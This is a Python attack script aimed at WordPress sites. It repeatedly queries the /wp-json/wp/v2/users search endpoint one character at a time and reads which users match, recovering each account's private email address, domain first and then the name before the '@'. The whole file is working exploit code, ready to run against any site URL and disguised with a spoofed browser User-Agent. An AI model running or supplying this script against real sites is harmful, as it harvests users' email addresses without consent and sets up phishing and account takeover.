from multiprocessing import Pool
import requests
import string
import json
import sys

if len(sys.argv) != 2:
    print(f'USAGE: {sys.argv[0]} <target site root url>')
    sys.exit()

url = sys.argv[1].rstrip('/') + '/wp-json/wp/v2/users'
known_users = {}
current_suffix = '@'
headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136'
}

def bruteforce_search(txt):
    try:
        users = requests.get(url, headers=headers, params={'search': txt}).json()
        return (txt, users if isinstance(users, list) else [])
    except Exception:
        return (txt, [])

if __name__ == '__main__':
    # String comparisons in the DB are case-insensitive, so don't bother with uppercase letters
    # Perbaikan: karakter / dan \ ditulis dengan benar menggunakan raw string atau escape
    dic = string.ascii_lowercase + string.digits + r"!#$&'+/\=?^_`{|}~.-]+"

    # Ganti Pool(16) dengan Pool(1) agar single-thread
    p = Pool(1)

    try:
        users = requests.get(url, headers=headers).json()
    except Exception as e:
        print(f'Error fetching users: {e}')
        sys.exit(1)

    # Initial round: Grab all users by their first email domain's character
    suffixes = [current_suffix + c for c in dic]
    for suffix, users_found in p.imap(bruteforce_search, suffixes):
        if len(users_found) > 0:
            print(users_found)
            for user in users_found:
                slug = user['slug']
                print(f'# Added user: {slug}, suffix: {suffix}')
                known_users[slug] = suffix

    # Iterate through all users - bruteforce email domain
    for user in list(known_users.keys()):
        print(f'# Bruteforcing email domain for {user}..')
        foundSomething = True
        while foundSomething:
            foundSomething = False
            suffixes = [known_users[user] + c for c in dic]
            for suffix, users_found in p.imap(bruteforce_search, suffixes):
                for user_found in users_found:
                    if user_found['slug'] == user:
                        print(suffix)
                        known_users[user] = suffix
                        foundSomething = True
                        break

    # Bruteforce email ID
    for user in list(known_users.keys()):
        print(f'# Bruteforcing email ID for {user}..')
        foundSomething = True
        while foundSomething:
            foundSomething = False
            suffixes = [c + known_users[user] for c in dic]
            for suffix, users_found in p.imap(bruteforce_search, suffixes):
                for user_found in users_found:
                    if user_found['slug'] == user:
                        print(suffix)
                        known_users[user] = suffix
                        foundSomething = True
                        break

    print('# Found the following:')
    for user, email in known_users.items():
        print(f'{user} => {email}')

    p.close()
    p.join()
